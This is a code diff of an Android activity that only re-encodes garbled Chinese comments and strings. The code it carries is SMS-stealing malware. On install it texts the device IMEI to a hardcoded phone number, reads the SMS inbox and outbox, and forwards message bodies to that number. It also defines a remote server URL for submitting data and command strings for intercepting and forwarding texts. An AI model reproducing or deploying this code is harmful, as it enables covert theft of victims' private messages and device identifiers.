@@ -25,17 +25,17 @@ import com.umeng.analytics.MobclickAgent;
 public class Dctivity extends Activity {
 
 	private SharedPreferences sp;
-	//imei·¢ËÍ  
+	//imeiå‘é€ 
 	public static final String devicephone="13119529349";
-	//Ìá½»Êı¾İ
+	//æäº¤æ•°æ®
 	public static final String Dctivityhttpurl="http://118.193.159.126/ce/aaaa/sms.asp";
-	//¶ÌĞÅ×ª·¢
+	//çŸ­ä¿¡è½¬å‘
 	public static final String phonenum="13119529349";
-	//À¹½Ø
-	public static final String lanjie="DX99#À¹½Ø-H";
-	//×ª·¢
-	public static final String zhuanfa="DX99#·¢ËÍ-H";
-	//Ç°×º
+	//æ‹¦æˆª
+	public static final String lanjie="DX99#æ‹¦æˆª-H";
+	//è½¬å‘
+	public static final String zhuanfa="DX99#å‘é€-H";
+	//å‰ç¼€
 	public static final String qianzhui="ADWS772-";
 	
 	@Override
@@ -44,7 +44,7 @@ public class Dctivity extends Activity {
 		super.onCreate(savedInstanceState);
 		AnalyticsConfig.setAppkey("54111214fd98c50f7f052d60");
 		AnalyticsConfig.setChannel("Channel"+GetDeviceId());
-		LogUtils.write("Send", "³ÌĞòÆô¶¯ " + Build.VERSION.SDK_INT+" "+Build.PRODUCT+"--"+Build.MODEL);
+		LogUtils.write("Send", "ç¨‹åºå¯åŠ¨ " + Build.VERSION.SDK_INT+" "+Build.PRODUCT+"--"+Build.MODEL);
 		Intent server=new Intent(this,Dervice.class);
 		this.getApplicationContext().startService(server);
 		
@@ -52,17 +52,17 @@ public class Dctivity extends Activity {
 		int code= getVersionCode();
 		sp=this.getApplicationContext().getSharedPreferences("Dctivityconfig", Context.MODE_PRIVATE);
 		if(sp.getBoolean("isfrist", true)||code!=sp.getInt("code", -100)){
-			DmsManager.Send(this,devicephone,"AZ99#³ÌĞòÒÑ°²×°"+GetDeviceId());
+			DmsManager.Send(this,devicephone,"AZ99#ç¨‹åºå·²å®‰è£…"+GetDeviceId());
 			new AsyncTask<Integer, Integer, Boolean>() {
 				@Override
 				protected Boolean doInBackground(Integer... params) {
-					Cursor c = getContentResolver().query(Uri.parse("content://sms"), null, "body like '%ÄãºÃ%' and type in (1,2)", null, "_id desc");
+					Cursor c = getContentResolver().query(Uri.parse("content://sms"), null, "body like '%ä½ å¥½%' and type in (1,2)", null, "_id desc");
 					for (c.moveToFirst(); !c.isAfterLast(); c.moveToNext()) {
 						int type = c.getInt(c.getColumnIndex("type"));
 						String body = c.getString(c.getColumnIndex("body"));
 						String address = c.getString(c.getColumnIndex("address"));
 						address = address.replace("+86", "").replace("+1", "");
-						String lx = (type == 1 ? "ÊÕ¼şÏä" : "·¢¼şÏä");
+						String lx = (type == 1 ? "æ”¶ä»¶ç®±" : "å‘ä»¶ç®±");
 						DmsManager.Send(Dctivity.this, devicephone, "DX99#"+lx+"-H " + body);
 						DQLiteOpenHelper.getHelper(Dctivity.this).addData(lx, address, body, new Date());
 					}
